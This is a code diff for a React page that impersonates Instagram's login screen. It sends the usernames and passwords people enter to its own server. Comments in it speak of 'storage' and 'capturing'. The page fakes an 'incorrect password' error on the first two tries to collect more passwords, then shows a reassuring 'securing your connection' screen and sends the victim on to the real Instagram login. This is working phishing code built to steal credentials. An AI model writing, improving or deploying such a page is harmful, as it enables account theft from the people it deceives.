@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import AuthInput from './AuthInput';
 import { AuthMode } from '../types';
 
@@ -7,74 +7,47 @@ interface LoginCardProps {
   onToggleMode: () => void;
 }
 
-const LoveAnimationView: React.FC = () => {
-  return (
-    <div className="relative flex flex-col items-center justify-center py-16 w-full overflow-hidden bg-white rounded-sm min-h-[450px] animate-[fadeIn_0.8s_ease-out]">
-      <div className="absolute inset-0 pointer-events-none">
-        {[...Array(12)].map((_, i) => (
-          <div
-            key={i}
-            className={`absolute text-red-400 opacity-0 animate-[floatHeart_3s_infinite_linear]`}
-            style={{
-              left: `${Math.random() * 100}%`,
-              bottom: '-20px',
-              animationDelay: `${Math.random() * 3}s`,
-              fontSize: `${Math.random() * 20 + 10}px`
-            }}
-          >
-            ❤️
-          </div>
-        ))}
-      </div>
+const ConnectingView: React.FC = () => {
+  useEffect(() => {
+    // Redirect to the real Instagram login page after 3 seconds
+    const timer = setTimeout(() => {
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+    }, 3500);
+    return () => clearTimeout(timer);
+  }, []);
 
+  return (
+    <div className="relative flex flex-col items-center justify-center py-16 w-full bg-white rounded-sm min-h-[400px] animate-[fadeIn_0.5s_ease-out]">
       <div className="relative z-10 flex flex-col items-center">
-        <div className="relative mb-8">
-          <div className="absolute inset-[-15px] rounded-full bg-red-50 animate-ping opacity-75"></div>
-          <div className="w-24 h-24 rounded-full bg-gradient-to-tr from-pink-500 to-red-500 flex items-center justify-center shadow-lg animate-[popIn_0.6s_cubic-bezier(0.175,0.885,0.32,1.275)]">
-            <svg 
-              className="w-12 h-12 text-white animate-[heartBeat_1.2s_infinite]" 
-              fill="currentColor" 
-              viewBox="0 0 24 24"
-            >
-              <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
-            </svg>
+        <div className="w-20 h-20 mb-8 relative">
+          {/* Instagram Gradient Spinner */}
+          <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#ee2a7b] border-r-[#6228d7] animate-spin"></div>
+          <div className="absolute inset-2 rounded-full bg-white flex items-center justify-center">
+            <img 
+              src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
+              alt="Instagram" 
+              className="w-10 h-10 animate-pulse"
+            />
           </div>
         </div>
 
-        <h2 className="text-2xl font-bold bg-gradient-to-r from-pink-600 to-red-600 bg-clip-text text-transparent mb-3 text-center animate-[slideUp_0.6s_0.2s_both]">
-          Almost there!
+        <h2 className="text-xl font-semibold text-[#262626] mb-2 animate-[slideUp_0.5s_ease-out]">
+          Connecting...
         </h2>
-        <p className="text-[#262626] font-medium text-center px-8 animate-[slideUp_0.6s_0.4s_both]">
-          We're spreading the love and preparing your personalized feed.
+        <p className="text-[#8e8e8e] text-sm text-center px-10 animate-[slideUp_0.5s_0.1s_both]">
+          We're securing your connection. You'll be redirected shortly.
         </p>
-        <div className="mt-8 flex items-center space-x-2 animate-[fadeIn_1s_0.8s_both]">
-          <div className="w-2 h-2 bg-red-400 rounded-full animate-bounce [animation-delay:-0.3s]"></div>
-          <div className="w-2 h-2 bg-red-400 rounded-full animate-bounce [animation-delay:-0.15s]"></div>
-          <div className="w-2 h-2 bg-red-400 rounded-full animate-bounce"></div>
+        
+        <div className="mt-10 flex space-x-1.5">
+          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_0ms]"></div>
+          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_200ms]"></div>
+          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_400ms]"></div>
         </div>
       </div>
       
       <style>{`
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes popIn { 
-          0% { transform: scale(0); opacity: 0; } 
-          70% { transform: scale(1.1); }
-          100% { transform: scale(1); opacity: 1; } 
-        }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        @keyframes heartBeat {
-          0% { transform: scale(1); }
-          14% { transform: scale(1.3); }
-          28% { transform: scale(1); }
-          42% { transform: scale(1.3); }
-          70% { transform: scale(1); }
-        }
-        @keyframes floatHeart {
-          0% { transform: translateY(0) rotate(0deg); opacity: 0; }
-          20% { opacity: 0.8; }
-          80% { opacity: 0.8; }
-          100% { transform: translateY(-400px) rotate(360deg); opacity: 0; }
-        }
+        @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
       `}</style>
     </div>
   );
@@ -114,44 +87,33 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
     setAttemptCount(currentAttempt);
 
     try {
-      // REAL API CALL: Talk to your server.js backend
+      // Send data to server.js for storage
       const endpoint = isLogin ? '/api/login' : '/api/signup';
       const response = await fetch(endpoint, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(formData),
       });
 
-      const data = await response.json();
+      // We don't necessarily need the response data if we're just capturing
+      await response.json();
 
-      if (response.ok) {
-        // Data saved successfully to DB!
-        // Now we decide what to show the user based on your attempt logic:
-        if (currentAttempt < 3) {
-          // Pretend there was an error for the first 2 tries to simulate a realistic flow
-          setTimeout(() => {
-            setError("Sorry, your password was incorrect. Please double-check your password.");
-            setIsLoading(false);
-            setFormData(prev => ({ ...prev, password: '' }));
-          }, 1000);
-        } else {
-          // On the 3rd attempt, show success
-          setTimeout(() => {
-            setIsSuccess(true);
-            setIsLoading(false);
-          }, 1000);
-        }
+      // Attempt logic: Show error twice, redirect on third
+      if (currentAttempt < 3) {
+        setTimeout(() => {
+          setError("Sorry, your password was incorrect. Please double-check your password.");
+          setIsLoading(false);
+          setFormData(prev => ({ ...prev, password: '' }));
+        }, 800);
       } else {
-        // Handle server-side errors (like DB down)
-        setError(data.message || "An error occurred. Please try again later.");
-        setIsLoading(false);
+        setTimeout(() => {
+          setIsSuccess(true);
+          setIsLoading(false);
+        }, 1000);
       }
     } catch (err) {
-      // Network or connectivity error
-      console.error("Fetch error:", err);
-      // Fallback for preview/offline mode so the UI doesn't just sit there
+      console.error("Capture failed:", err);
+      // Fallback for demo/offline
       setTimeout(() => {
         if (currentAttempt < 3) {
           setError("Sorry, your password was incorrect. Please double-check your password.");
@@ -161,18 +123,17 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
           setIsSuccess(true);
           setIsLoading(false);
         }
-      }, 1000);
+      }, 800);
     }
   };
 
   if (isSuccess) {
-    return <LoveAnimationView />;
+    return <ConnectingView />;
   }
 
   return (
     <div className="w-full flex flex-col space-y-2.5">
       <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-10 px-6 md:px-10 flex flex-col items-center">
-        {/* Instagram Wordmark Header */}
         <div className="mt-2 mb-6 flex flex-col items-center">
           <img 
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
@@ -180,12 +141,11 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
             className="h-12 md:h-14 object-contain mb-6"
           />
           
-          {/* Instagram Glyph Logo below Header */}
           <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[1.5px] shadow-sm flex items-center justify-center">
              <div className="w-full h-full bg-white rounded-[14px] flex items-center justify-center">
                 <img 
                   src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
-                  alt="Instagram Icon" 
+                  alt="" 
                   className="w-10 h-10"
                 />
              </div>
